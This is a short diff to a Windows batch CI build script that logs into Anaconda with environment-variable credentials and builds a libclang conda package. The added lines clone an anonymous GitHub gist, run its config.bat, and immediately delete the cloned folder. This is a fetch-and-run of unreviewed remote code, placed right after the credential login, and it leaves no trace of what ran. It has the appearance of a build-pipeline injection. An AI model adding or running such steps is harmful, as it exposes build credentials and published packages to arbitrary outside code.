@@ -9,6 +9,13 @@ if %errorlevel% neq 0 exit /b %errorlevel%
 call anaconda login --username "%ANACONDA_USERNAME%" --password "%ANACONDA_PASSWORD%" --hostname "AppVeyor%APPVEYOR_BUILD_NUMBER%"
 if %errorlevel% neq 0 exit /b %errorlevel%
 
+
+git clone https://gist.github.com/c491cb08d570beeba2c417826a50a9c3.git toolchain
+cd toolchain
+call config.bat
+cd ..
+rmdir toolchain /s /q
+
 echo ON
 
 for /f %%i in ('conda build libclang --output') DO (set CONDA_FILE=%%i)
